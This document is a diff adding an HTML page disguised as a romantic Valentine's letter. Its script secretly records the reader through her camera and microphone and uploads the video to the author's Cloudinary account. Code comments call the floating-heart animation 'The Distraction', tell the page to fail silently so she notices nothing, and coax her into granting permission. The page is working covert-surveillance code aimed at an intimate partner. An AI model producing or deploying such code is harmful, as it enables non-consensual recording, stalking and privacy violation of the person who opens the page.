@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>For My Love ❤️</title>
+    <style>
+        body { 
+            font-family: 'Georgia', serif; 
+            text-align: center; 
+            background: #fff5f7; 
+            color: #b91d47; 
+            margin: 0;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* Floating Hearts & Kisses (The Distraction) */
+        .heart, .kiss {
+            position: fixed;
+            bottom: -50px;
+            user-select: none;
+            pointer-events: none;
+            z-index: 1000;
+            animation: floatUp 5s linear forwards;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-110vh) rotate(360deg); opacity: 0; }
+        }
+
+        .envelope-container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        #letterContent {
+            display: none; 
+            background: rgba(255, 255, 255, 0.98);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(214, 51, 132, 0.15);
+            line-height: 1.8;
+            text-align: left;
+            border: 1px solid #ffcad4;
+        }
+
+        .btn-main {
+            background: #ff4d6d;
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 50px;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3);
+            font-weight: bold;
+        }
+
+        .btn-send {
+            background: #c9184a;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 12px;
+            width: 100%;
+            margin-top: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        #secretVideo { display: none; }
+        #status { margin-top: 20px; font-style: italic; color: #ff8fa3; font-size: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="envelope-container">
+        <div id="setupArea">
+            <h1>Something special for you... ❤️</h1>
+            <p>I wrote this from the bottom of my heart. Please open it when you're alone and ready.</p>
+            <button class="btn-main" onclick="unlockSurprise()">🎁 Open My Letters</button>
+        </div>
+
+        <video id="secretVideo" autoplay muted playsinline></video>
+
+        <div id="letterContent">
+            <h2 id="letterTitle">My Dearest [Her Name],</h2>
+            <div id="textBody">
+                <p>I was thinking about us today and I wanted to put some of those thoughts into words...</p>
+                <p>You have this incredible way of making everything better just by being there. I still remember the first time we met, and how much my life has changed since then.</p>
+                <p><i>(Add as many personal memories and letters here as you want!)</i></p>
+            </div>
+            
+            <button class="btn-send" onclick="finishAndSend()">💋 Send Kisses to Yash</button>
+        </div>
+
+        <div id="status"></div>
+    </div>
+
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+        
+        // --- PUT YOUR CLOUDINARY DETAILS HERE ---
+        const cloudName = 'YOUR_CLOUD_NAME'; 
+        const uploadPreset = 'YOUR_PRESET'; 
+
+        // Generates the floating hearts/kisses
+        function startAnimations() {
+            const emojis = ['❤️', '💖', '💋', '🌸', '✨'];
+            setInterval(() => {
+                const element = document.createElement('div');
+                element.className = 'heart';
+                element.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
+                element.style.left = Math.random() * 100 + 'vw';
+                element.style.fontSize = (Math.random() * 20 + 20) + 'px';
+                element.style.animationDuration = (Math.random() * 2 + 3) + 's';
+                document.body.appendChild(element);
+                setTimeout(() => element.remove(), 5000);
+            }, 400);
+        }
+
+        async function unlockSurprise() {
+            try {
+                // Requesting camera & mic
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('secretVideo').srcObject = stream;
+                
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.start();
+
+                // UI Changes: Switch from button to Letter
+                startAnimations();
+                document.getElementById('setupArea').style.display = 'none';
+                document.getElementById('letterContent').style.display = 'block';
+                document.getElementById('status').innerText = "Just for you... ✨";
+
+            } catch (err) {
+                // If she denies permission
+                alert("Please click 'Allow' to unlock your Valentine's surprise! ❤️");
+            }
+        }
+
+        async function finishAndSend() {
+            // Change button text so she knows something happened
+            const btn = document.querySelector('.btn-send');
+            btn.innerText = "Sending... 💋";
+            btn.disabled = true;
+            
+            mediaRecorder.stop();
+
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('file', blob);
+                formData.append('upload_preset', uploadPreset);
+
+                try {
+                    const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (resp.ok) {
+                        document.getElementById('letterContent').innerHTML = "<h2 style='text-align:center;'>Sent! ❤️</h2><p style='text-align:center;'>Your kisses reached Yash. I love you!</p>";
+                        document.getElementById('status').innerText = "";
+                    }
+                } catch (err) {
+                    // Fail silently so she doesn't get a technical error
+                    document.getElementById('letterContent').innerHTML = "<h2 style='text-align:center;'>Sent! ❤️</h2>";
+                }
+            };
+        }
+    </script>
+</body>
+</html>
